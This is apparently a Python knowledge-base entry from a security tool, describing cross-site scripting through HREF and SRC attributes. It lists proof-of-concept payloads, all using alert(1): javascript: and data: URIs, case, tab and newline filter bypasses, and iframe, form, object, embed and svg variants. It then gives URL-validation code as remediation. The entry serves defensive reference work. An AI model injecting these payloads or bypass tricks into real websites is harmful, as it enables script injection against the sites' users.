#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: HREF/SRC Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in HREF/SRC Attributes",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "href", "src", "javascript", "url", "link", "redirect"],
    "description": """
HREF and SRC attribute XSS occurs when user input controls URL-type attributes
without proper validation. Allows javascript: protocol and data: URI injection.

SEVERITY: HIGH
Very common vulnerability. Users expect links to be safe. Often leads to phishing or XSS.
Affects <a>, <iframe>, <script>, <img>, <link>, <form action>, and more.
""",
    "attack_vector": """
JAVASCRIPT PROTOCOL:
<a href="javascript:alert(1)">Click</a>

DATA URI:
<a href="data:text/html,<script>alert(1)</script>">

VBSCRIPT (IE):
<a href="vbscript:msgbox(1)">

URL ENCODING:
<a href="java&#x73;cript:alert(1)">

CASE VARIATIONS:
<a href="JaVaScRiPt:alert(1)">

NEWLINE BYPASS:
<a href="java
script:alert(1)">

TAB BYPASS:
<a href="java	script:alert(1)">

SRC ATTRIBUTE:
<iframe src="javascript:alert(1)">

FORM ACTION:
<form action="javascript:alert(1)">

FORMACTION:
<button formaction="javascript:alert(1)">

OBJECT DATA:
<object data="javascript:alert(1)">

EMBED SRC:
<embed src="javascript:alert(1)">

SVG USE:
<svg><use href="javascript:alert(1)"></svg>
""",
    "remediation": """
DEFENSE:

1. WHITELIST allowed protocols (http:, https:, mailto:)
2. Block javascript:, data:, vbscript: protocols
3. Validate URL structure
4. Use URL parsing libraries
5. Encode output for HTML attributes
6. Implement CSP with strict base-uri

URL VALIDATION (Python):
from urllib.parse import urlparse
def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https', 'mailto', '')

JavaScript:
function isSafeUrl(url) {
  try {
    const u = new URL(url, window.location.origin);
    return ['http:', 'https:'].includes(u.protocol);
  } catch { return false; }
}

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- Unvalidated Redirects and Forwards
""",
}
